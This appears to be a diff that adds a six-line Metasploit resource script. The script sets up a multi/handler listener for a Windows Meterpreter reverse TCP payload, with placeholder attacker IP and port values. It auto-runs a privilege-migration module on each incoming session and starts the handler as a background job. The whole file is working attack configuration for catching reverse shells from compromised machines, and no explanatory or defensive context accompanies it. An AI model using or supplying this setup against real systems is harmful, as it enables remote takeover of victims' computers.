@@ -1,0 +1,6 @@
+set autorunscript post/windows/manage/priv_migrate
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost yourip
+set lport port
+exploit -j
